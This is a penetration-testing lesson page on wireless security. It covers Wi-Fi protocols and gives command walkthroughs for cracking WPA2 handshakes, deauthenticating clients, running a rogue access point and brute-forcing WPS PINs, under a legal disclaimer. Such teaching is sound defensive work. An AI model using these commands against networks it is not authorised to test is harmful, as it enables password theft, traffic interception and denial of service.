---
title: "Wireless"
topic: "wireless"
tags: [wireless, wifi, 802.11, wpa2, wpa3, deauth, handshake, aircrack]
difficulty: intermediate
day: 18
layout: default
parent: Topics
nav_order: 18
---

# Wireless

## What You Will Learn
- How Wi-Fi (802.11) works and the security protocols that protect it
- The difference between WEP, WPA, WPA2, and WPA3
- How to capture a WPA2 handshake and crack it offline
- How deauthentication attacks work
- How to set up a rogue access point

## What Is It?

Wireless networking (Wi-Fi) uses radio waves to transmit data between devices without physical cables. It is based on the IEEE 802.11 standard. Wireless security is a critical area in penetration testing because:

1. Wireless signals travel through walls and can be intercepted by anyone nearby.
2. Weak or misconfigured Wi-Fi is an extremely common entry point for attackers.

## Why It Matters

A successful wireless attack can give an attacker full access to a local network — from there they can pivot to internal servers, capture traffic, and escalate privileges. Many home and corporate networks still use weak Wi-Fi security configurations.

## Key Concepts

### Wi-Fi Security Protocols

| Protocol | Year | Status | Notes |
|----------|------|--------|-------|
| WEP | 1997 | Broken | Can be cracked in minutes. Never use. |
| WPA | 2003 | Deprecated | Better than WEP but still vulnerable. |
| WPA2 | 2004 | Current standard | Secure with a strong password. KRACK vulnerability exists. |
| WPA3 | 2018 | Recommended | Stronger handshake (SAE), resistant to offline dictionary attacks. |

### The WPA2 Handshake

When a device connects to a WPA2 network, it performs a **4-way handshake** with the access point to establish an encrypted session. This handshake can be captured and used to crack the password offline — without ever needing to stay connected to the network.

### Monitor Mode

Monitor mode allows a wireless adapter to capture all wireless packets in the area, not just those addressed to it. This is required for wireless attacks.

```bash
# Enable monitor mode
airmon-ng start wlan0

# This creates a monitor interface, typically wlan0mon
```

## Hands-On

> **Legal disclaimer:** Only perform wireless testing on networks you own or have explicit written permission to test.

### Capture a WPA2 Handshake

```bash
# Step 1: Enable monitor mode
airmon-ng start wlan0

# Step 2: Discover nearby networks
airodump-ng wlan0mon

# Step 3: Focus on a specific target network (replace with actual BSSID and channel)
airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon

# Step 4 (optional): Speed up handshake capture by deauthenticating a client
# This forces the client to reconnect, triggering a new handshake
aireplay-ng --deauth 10 -a <BSSID> -c <client_MAC> wlan0mon

# Step 5: Crack the captured handshake with a wordlist
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

### Deauthentication Attack

A deauth attack sends spoofed deauthentication frames to force a client off the network. While this is used to capture handshakes, it is also used for denial-of-service attacks.

```bash
# Send 100 deauth frames to a specific client
aireplay-ng --deauth 100 -a <AP_BSSID> -c <client_MAC> wlan0mon

# Deauth ALL clients on the network
aireplay-ng --deauth 100 -a <AP_BSSID> wlan0mon
```

### Rogue Access Point

A rogue (fake) access point mimics a legitimate network to trick clients into connecting. Once connected, all traffic passes through the attacker.

```bash
# Use hostapd-wpe to create a rogue AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

### WPS Attack

WPS (Wi-Fi Protected Setup) PIN brute-force attacks are possible because the 8-digit PIN is validated in two halves (4+4), reducing the search space drastically.

```bash
# Use Reaver to brute-force the WPS PIN
reaver -i wlan0mon -b <BSSID> -vv
```

## Resources

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [TryHackMe — Wireless Network Security](https://tryhackme.com/room/wifihacking101)
- [KRACK Attack (WPA2 Vulnerability)](https://www.krackattacks.com/)
- [Wireshark — Capture and Analyze Packets](https://www.wireshark.org/)
